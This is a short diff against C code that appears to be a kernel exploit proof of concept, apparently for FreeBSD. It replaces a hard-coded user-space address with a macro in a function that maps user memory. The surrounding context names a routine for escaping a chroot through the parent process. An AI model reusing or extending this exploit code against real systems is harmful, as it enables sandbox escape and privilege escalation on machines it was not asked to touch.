@@ -9,6 +9,7 @@
 #include <sys/bio.h>
 #include <sys/_stdarg.h>
 
+#define USER_MAPPED_MEMORY_ADDRESS 0x0000414141410000ULL
 extern struct mtx Giant;
 extern struct prison prison0;
 
@@ -129,7 +130,7 @@ void poc_escape_chroot_parent_process(void) {
 
 struct buf* map_user_memory(void) {
   struct buf* buf = NULL;
-  void* fixed = (void*)(uintptr_t)0x0000414141410000ULL;
+  void* fixed = (void*)(uintptr_t)USER_MAPPED_MEMORY_ADDRESS;
 
   buf = uma_zalloc(pbuf_zone, M_WAITOK);
   buf->b_iocmd = BIO_READ;
